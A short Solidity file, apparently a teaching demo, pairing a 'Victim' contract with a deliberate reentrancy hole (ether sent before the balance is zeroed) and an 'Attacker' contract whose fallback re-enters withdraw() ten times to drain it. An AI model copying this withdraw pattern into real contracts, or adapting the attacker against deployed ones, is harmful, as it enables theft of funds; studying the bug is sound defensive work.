pragma solidity ^0.4.26;

contract Victim {
    //amount to withdraw
    uint public amount = 1 ether;
    
    //Remember to send certain amount >= 10 ether
    constructor() public payable {}
    
    function withdraw()
        public
    {
        require(msg.sender.call.value(amount)());
        amount = 0;
    }
    function getContractBalance() public view returns(uint) { return address(this).balance;}
}

contract Attacker {
    Victim v;
    uint public count;
    
    event LogFallback(uint _count, uint _balance);
    
    constructor(address victim) public payable {
        v = Victim(victim);
    }

    function attackerBalance() public view returns (uint) { return address(this).balance;}
    function attack() public { v.withdraw();}
    
    function() public payable {
        emit LogFallback(++count, address(this).balance);
        
        //It avoids to drain all gas and stop the attack.
        if(count < 10) v.withdraw(); 
    }
}